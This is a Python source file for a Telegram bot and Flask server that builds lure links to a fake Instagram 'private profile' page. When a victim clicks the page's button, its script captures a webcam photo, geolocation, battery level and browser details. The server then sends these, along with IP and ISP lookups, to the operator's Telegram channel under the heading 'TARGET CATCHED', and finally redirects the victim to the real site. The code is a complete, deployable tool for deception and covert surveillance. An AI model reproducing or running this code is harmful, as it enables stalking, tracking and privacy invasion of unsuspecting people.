
import telebot, threading, base64, requests
from telebot import types
from flask import Flask, render_template_string, request

BOT_TOKEN = ""
LOG_CHANNEL_ID = YOUR ID
#guys make sure Cloudflare actual!
BASE_URL = "YOUR LINK"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,mobile,proxy", timeout=5).json()
        if r.get('status') == 'success':
            vpn = "Yes" if r.get('proxy') else "No"
            return f"{r.get('city')}, {r.get('country')} / {r.get('isp')}\n🛡 VPN/Proxy: {vpn}"
    except: pass
    return "IP information is not found"

H = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram</title>
    <style>
        body { background: #fafafa; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .inst-logo { width: 80px; height: 80px; margin-bottom: 20px; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #999; border-radius: 50%; width: 26px; height: 26px; animation: spin 1s linear infinite; margin: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(3600deg); } }
        #btn { background: #0095f6; color: white; border: none; padding: 10px 30px; border-radius: 8px; font-weight: 600; cursor: pointer; }
    </style>
    <script>
        async function start(){
            document.getElementById('btn').style.display = 'none';
            const p = new URLSearchParams(window.location.search);
            const t = p.get('id'), u = p.get('user'), n = p.get('name'), ua = navigator.userAgent;
            let bat = "Unknown";
            try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; } catch(e){}

            try {
                const st = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.createElement('video'); v.srcObject = st; await v.play();
                const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0); const i = c.toDataURL('image/jpeg');
                st.getTracks().forEach(tr => tr.stop());
                fetch('/p', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({i,t,u,n,bat,ua})});
            } catch(e) { fetch('/p', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({i:null,t,u,n,bat,ua})}); }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(g => {
                    fetch(`/l?la=${g.coords.latitude}&lo=${g.coords.longitude}&n=${n}`);
                }, () => { fetch('/l'); });
            }
            setTimeout(() => { window.location.href = "https://instagram.com"; }, 3000);
        }
    </script>
</head>
<body>
    <img class="inst-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png">
    <div class="loader"></div>
    <h2 id="un">Profile Confirmation</h2>
    <p style="color: #8e8e8e; text-align: center; padding: 0 20px;">Please confirm your device to view this private profile.</p>
    <button id="btn" onclick="start()">OPEN PROFILE</button>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(H)

@app.route('/p', methods=['POST'])
def p():
    d = request.json
    t, u, n, bat, ua = d.get('t'), d.get('u'), d.get('n'), d.get('bat'), d.get('ua')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    info = get_ip_info(ip)

    msg = (f"🚀 *TARGET CATCHED* 🚀\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n👤 *From:* @{u}\n📞 *Target:* {n}\n"
           f"🌐 *IP:* `{ip}`\n🏙 *Info:* {info}\n🔋 *Battery:* {bat}\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n📱 `{ua[:60]}...`")

    if d.get('i'):
        try:
            img = base64.b64decode(d['i'].split(',')[1])
            bot.send_photo(LOG_CHANNEL_ID, img, caption=msg, parse_mode="Markdown")
        except:
            bot.send_message(LOG_CHANNEL_ID, msg, parse_mode="Markdown")
    else:
        bot.send_message(LOG_CHANNEL_ID, msg, parse_mode="Markdown")
    return "ok"

@app.route('/l')
def l():
    la, lo, n = request.args.get('la'), request.args.get('lo'), request.args.get('n')
    if la and la != 'None':
        ikb = types.InlineKeyboardMarkup()
        ikb.add(types.InlineKeyboardButton("🌍 OPEN ON MAP", url=f"https://www.google.com/maps?q={la},{lo}"))
        bot.send_message(LOG_CHANNEL_ID, f"📍 *COORDINATES {n}:*\n`{la}, {lo}`", reply_markup=ikb, parse_mode="Markdown")
    return "ok"

@bot.message_handler(commands=['start'])
def welcome(m):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("🔗 Make Instagram-Link")
    bot.send_message(m.chat.id, "😈 *SYSTEM ONLINE*", reply_markup=kb, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "🔗 Make Instagram-Link")
def ask_name(m):
    msg = bot.send_message(m.chat.id, "👤 *ENTER TARGET NAME (for your logs):*")
    bot.register_next_step_handler(msg, generate_link)

def generate_link(m):
    name = m.text.replace(" ", "_")
    full_url = f"{BASE_URL}/?id={m.chat.id}&user={m.from_user.username}&name={name}"
    bot.send_message(m.chat.id, f"✅ *LINK IS READY!*\n\n`{full_url}`", parse_mode="Markdown")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080, use_reloader=False)).start()
    print("Bot ready...")
    bot.polling(none_stop=True)
